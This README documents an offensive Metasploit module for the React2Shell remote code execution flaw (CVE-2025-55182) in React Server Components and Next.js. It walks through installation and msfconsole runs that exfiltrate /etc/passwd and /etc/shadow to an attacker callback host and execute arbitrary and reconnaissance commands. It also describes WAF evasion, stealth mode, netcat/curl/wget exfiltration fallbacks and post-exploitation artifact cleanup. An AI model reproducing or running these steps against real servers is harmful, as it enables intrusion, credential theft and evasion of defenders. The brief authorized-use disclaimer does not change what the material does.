# React2Shell Metasploit Module (CVE-2025-55182) [BETA]

A robust Metasploit module to exploit the React2Shell vulnerability (CVE-2025-55182) using Out-of-Band (OOB) techniques for data exfiltration and remote command execution.

## 🎯 Key Features

### Core Capabilities
- **Automatic Vulnerability Detection**: Non-destructive vulnerability checking with detailed reporting
- **File Exfiltration**: Extract files from target systems via multiple methods
- **Command Execution**: Execute arbitrary commands with output capture
- **Multi-Session Management**: Handle concurrent operations with session isolation
- **Large Data Handling**: Support for multi-KB transfers with chunked processing
- **Comprehensive Error Handling**: Detailed error reporting and automatic retry logic

### Advanced Features
- **Adaptive Payload Selection**: Automatic fallback between wget, curl, netcat, and custom methods
- **Payload Evasion**: WAF bypass techniques and anti-detection measures
- **SSL/TLS Auto-Detection**: Automatic protocol detection and handling
- **Extensible Architecture**: Template design for easy customization and extension

## 📋 Requirements

- **Metasploit Framework** 6.0+
- **Ruby** 2.7+
- **Required Gems**: `rspec`, `rspec-quickcheck` (for testing)

## 🚀 Installation

### Method 1: Metasploit Framework Installation

```bash
# 1. Clone the repository
git clone https://github.com/your-username/react2shell-metasploit-oob.git
cd react2shell-metasploit-oob

# 2. Copy module to Metasploit
sudo cp react2shell_rce.rb /usr/share/metasploit-framework/modules/exploits/multi/http/

# 3. Copy auxiliary libraries
sudo mkdir -p /usr/share/metasploit-framework/lib/react2shell/
sudo cp lib/react2shell/*.rb /usr/share/metasploit-framework/lib/react2shell/

# 4. Reload Metasploit
msfconsole -q -x "reload_all"
```

### Method 2: Development and Testing

```bash
# 1. Clone the repository
git clone https://github.com/your-username/react2shell-metasploit-oob.git
cd react2shell-metasploit-oob

# 2. Install dependencies
bundle install

# 3. Run tests
rspec spec/

# 4. Verify installation
ruby verify_setup.rb
```

## 📖 Module Usage

### Vulnerability Check

```bash
msf6 > use exploit/multi/http/react2shell_rce
msf6 exploit(multi/http/react2shell_rce) > set RHOSTS 192.168.1.100
msf6 exploit(multi/http/react2shell_rce) > set LHOST 192.168.1.50
msf6 exploit(multi/http/react2shell_rce) > check
```

### Basic File Exfiltration

```bash
msf6 exploit(multi/http/react2shell_rce) > set RHOSTS target.example.com
msf6 exploit(multi/http/react2shell_rce) > set LHOST attacker.example.com
msf6 exploit(multi/http/react2shell_rce) > set FILEPATH /etc/passwd
msf6 exploit(multi/http/react2shell_rce) > run
```

### Command Execution

```bash
msf6 exploit(multi/http/react2shell_rce) > set RHOSTS target.example.com
msf6 exploit(multi/http/react2shell_rce) > set LHOST attacker.example.com
msf6 exploit(multi/http/react2shell_rce) > set CMD "id && whoami && uname -a"
msf6 exploit(multi/http/react2shell_rce) > run
```

### Advanced Usage with Adaptive Payloads

```bash
msf6 exploit(multi/http/react2shell_rce) > set RHOSTS target.example.com
msf6 exploit(multi/http/react2shell_rce) > set LHOST attacker.example.com
msf6 exploit(multi/http/react2shell_rce) > set FILEPATH /var/log/application.log
msf6 exploit(multi/http/react2shell_rce) > set ADAPTIVE true
msf6 exploit(multi/http/react2shell_rce) > set EVASION true
msf6 exploit(multi/http/react2shell_rce) > set CHUNK_SIZE 32768
msf6 exploit(multi/http/react2shell_rce) > run
```

## ⚙️ Configuration Options

### Required Options
- **RHOSTS**: Target host(s) to exploit
- **LHOST**: Local host for OOB callbacks
- **FILEPATH** or **CMD**: File path to exfiltrate OR command to execute

### Basic Options
- **TARGETURI**: Base path to vulnerable application (default: /)
- **SSL**: Use SSL/TLS for target communication (auto-detected)
- **ADAPTIVE**: Enable adaptive payload selection (default: true)
- **EVASION**: Enable payload evasion techniques (default: false)

### Advanced Options
- **SRVPORT**: HTTP server port for OOB data exfiltration (default: 8080)
- **SRVHOST**: HTTP server host for OOB data exfiltration (auto-detect if empty)
- **HTTP_DELAY**: Timeout for OOB callback reception (default: 30 seconds)
- **CHUNK_SIZE**: Chunk size for large data transfers (default: 65536 bytes)
- **MAX_SESSIONS**: Maximum concurrent OOB sessions (default: 10)
- **STEALTH**: Enable stealth mode - slower but less detectable (default: false)

## 🏗️ Module Architecture

### Component Overview
```
┌─────────────────────────────────────────────────────────────┐
│                    MetasploitModule                         │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────────┐  ┌─────────────────┐  ┌──────────────┐ │
│  │ ExploitEngine   │  │ PayloadGenerator│  │ OOBListener  │ │
│  │                 │  │                 │  │              │ │
│  │ - Orchestration │  │ - Flight Proto  │  │ - HTTP Server│ │
│  │ - Vuln Check    │  │ - Command Gen   │  │ - Data Parse │ │
│  │ - Error Handle  │  │ - Evasion       │  │ - Loot Store │ │
│  └─────────────────┘  └─────────────────┘  └──────────────┘ │
│  ┌─────────────────┐  ┌─────────────────┐  ┌──────────────┐ │
│  │ ConfigManager   │  │ SessionManager  │  │ ErrorHandler │ │
│  │                 │  │                 │  │              │ │
│  │ - Validation    │  │ - Multi-Session │  │ - Logging    │ │
│  │ - Connectivity  │  │ - Concurrency   │  │ - Statistics │ │
│  │ - SSL Detection │  │ - Cleanup       │  │ - Debugging  │ │
│  └─────────────────┘  └─────────────────┘  └──────────────┘ │
└─────────────────────────────────────────────────────────────┘
```

### Key Components

#### ExploitEngine
- Main orchestration component
- Coordinates all other components
- Handles vulnerability checking and exploit execution
- Manages multi-command operations

#### PayloadGenerator
- Generates Flight Protocol chunks
- Creates file exfiltration and command execution payloads
- Implements payload evasion and adaptation techniques
- Handles JavaScript escaping and validation

#### OOBListener
- HTTP server for receiving exfiltrated data
- Handles large data transfers with chunking
- Provides session management integration
- Automatic Metasploit loot storage

#### ConfigurationManager
- Validates module options and connectivity
- Handles SSL/TLS auto-detection
- Provides configuration access methods
- Network validation and error handling

#### SessionManager
- Manages multiple concurrent OOB sessions
- Prevents data mixing between sessions
- Handles session lifecycle and cleanup
- Provides session statistics and monitoring

#### ErrorHandler
- Centralized error handling and logging
- Implements retry logic for network errors
- Provides detailed error statistics
- Supports error log export for debugging

## 🐛 Vulnerability Details

### CVE-2025-55182
React Server Components (RSC) Flight Protocol vulnerability allowing prototype pollution through unsafe deserialization of Flight chunks. The vulnerability exists in:

- Next.js 14.3.x-canary
- Next.js 15.x
- Next.js 16.x
- React Server Components with Flight Protocol

### Exploitation Technique
1. **Prototype Pollution**: Abuse `_prefix` field in RSC chunks
2. **Function Constructor**: Transform `_formData.get` into `Function()` constructor
3. **Code Execution**: Execute arbitrary JavaScript on the server
4. **OOB Exfiltration**: Use Out-of-Band channels for data extraction

## 🔧 Payload Methods

### Primary Methods
- **wget**: Standard HTTP POST for file exfiltration and command output
- **curl**: Alternative HTTP client with different options
- **netcat**: Direct TCP connection for stealth operations

### Fallback Methods
- **Python**: Scripted HTTP requests using Python
- **Bash**: Pure bash implementations for restricted environments
- **Custom**: Extensible framework for additional methods

### Evasion Techniques
- **Case Variation**: Mixed case command variations
- **Whitespace Manipulation**: Alternative spacing and formatting
- **Command Obfuscation**: Encoded and indirect command execution
- **WAF Bypass**: Techniques to evade Web Application Firewalls

## 🛠️ Troubleshooting

### Common Issues

#### No OOB Callback Received
- Check firewall rules on LHOST
- Verify LHOST is reachable from target
- Ensure SRVPORT is not blocked
- Try different payload methods with ADAPTIVE=true

#### SSL/TLS Errors
- Module auto-detects SSL requirements
- Manually set SSL=true for HTTPS targets
- Check certificate validation issues

#### Large File Transfer Failures
- Increase HTTP_DELAY for large files
- Adjust CHUNK_SIZE for network conditions
- Monitor session statistics for progress

#### Payload Generation Errors
- Validate FILEPATH is absolute path
- Check command syntax for special characters
- Enable EVASION for restricted environments

### Debug Mode
Enable verbose output for detailed debugging:
```
set VERBOSE true
```

### Error Log Export
The module automatically exports comprehensive error logs in verbose mode, including:
- Network error details and retry attempts
- Payload generation failures and alternatives
- Session management issues and resolutions
- Component-specific error statistics

## 🧪 Testing and Development

### Run Test Suite

```bash
# Unit tests
rspec spec/lib/react2shell/ --format documentation

# Integration tests
rspec spec/ --tag integration

# Property-based tests
rspec spec/ --tag property
```

### Development Environment

```bash
# Setup development environment
bundle install --path vendor/bundle

# Run linter
rubocop lib/ spec/

# Generate documentation
yard doc
```

## 🔒 Security Considerations

### Operational Security
- Use STEALTH mode in sensitive environments
- Monitor target logs for detection indicators
- Clean up artifacts after successful exploitation

### Legal and Ethical Use
- Only use against systems you own or have explicit permission to test
- Follow responsible disclosure practices
- Comply with local laws and regulations

## 📚 Advanced Usage Examples

### Multiple File Exfiltration

```bash
# Script to exfiltrate multiple files
for file in /etc/passwd /etc/shadow /etc/hosts; do
  msfconsole -q -x "
    use exploit/multi/http/react2shell_rce;
    set RHOSTS 192.168.1.100;
    set LHOST 192.168.1.50;
    set FILEPATH $file;
    run;
    exit
  "
done
```

### System Reconnaissance

```bash
# Useful reconnaissance commands
msf6 exploit(multi/http/react2shell_rce) > set CMD "uname -a && whoami && pwd"
msf6 exploit(multi/http/react2shell_rce) > run

msf6 exploit(multi/http/react2shell_rce) > set CMD "ps aux | head -20"
msf6 exploit(multi/http/react2shell_rce) > run

msf6 exploit(multi/http/react2shell_rce) > set CMD "netstat -tulpn"
msf6 exploit(multi/http/react2shell_rce) > run
```

## 🔧 Extending the Module

### Custom Payload Methods
```ruby
# Add to PayloadEvasion class
def create_custom_payload(command, oob_url, options = {})
  # Your custom payload logic here
  "custom_command #{command} | custom_exfil #{oob_url}"
end
```

### Custom Evasion Techniques
```ruby
# Add to PayloadEvasion class
def apply_custom_evasion(payloads, options = {})
  payloads.map do |payload|
    # Your evasion logic here
    payload.gsub(/pattern/, 'replacement')
  end
end
```

### Custom Error Handling
```ruby
# Extend ErrorHandler class
def handle_custom_error(error, context, metadata = {})
  # Your error handling logic here
  log_error(:custom, error, context, metadata)
end
```

## ✅ Project Status

### Completed Tasks
- **✅ Project Structure**: Directories and base interfaces created
- **✅ Testing Framework**: RSpec + QuickCheck configured
- **✅ Components Implemented**: All main components developed
- **✅ Complete Integration**: Fully functional Metasploit module
- **✅ Documentation**: Complete usage and development guides

### Project Files
```
react2shellmetasploit/
├── lib/react2shell/              # Modular components (8 files)
├── spec/                        # Testing suite (8+ files)
├── react2shell_rce.rb          # Main Metasploit module
├── README.md                   # This documentation
├── Gemfile                     # Ruby dependencies
├── Rakefile                    # Build/test tasks
└── verify_setup.rb            # Verification script
```

## 📖 Referencias

### Enlaces Oficiales
- [CVE-2025-55182](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-55182)
- [React Server Components Documentation](https://react.dev/reference/rsc/server-components)
- [Next.js Security Advisories](https://github.com/vercel/next.js/security/advisories)
- [Metasploit Framework Documentation](https://docs.metasploit.com/)

### Research and PoCs
- [React2Shell Original Research](https://react2shell.com/)
- [Lachlan's Original PoC](https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc)
- [Assetnote Security Research](https://blog.assetnote.io/2025/01/09/react-server-components-rce/)

## 🤝 Contributing

### Report Issues
- Use the [issue tracker](https://github.com/your-username/react2shell-metasploit-oob/issues)
- Include detailed logs and steps to reproduce
- Specify software versions used

### Pull Requests
1. Fork the repository
2. Create feature branch: `git checkout -b feature/new-functionality`
3. Commit changes: `git commit -am 'Add new functionality'`
4. Push to branch: `git push origin feature/new-functionality`
5. Create Pull Request

## 📄 License

This module is released under the Metasploit Framework License (MSF_LICENSE).

## ⚠️ Disclaimer

This software is provided "as is" without warranties of any kind. The authors are not responsible for misuse of this tool. Using this software to attack systems without explicit authorization is illegal and strictly prohibited.

---

**Developed by**: Moises Tapia (Cl0wnr3v)  
**Specialization**: Cloud Security Architect, Cloud Penetration tester & Red Teamer
**Version**: 1.0.0  
**Last updated**: January 2025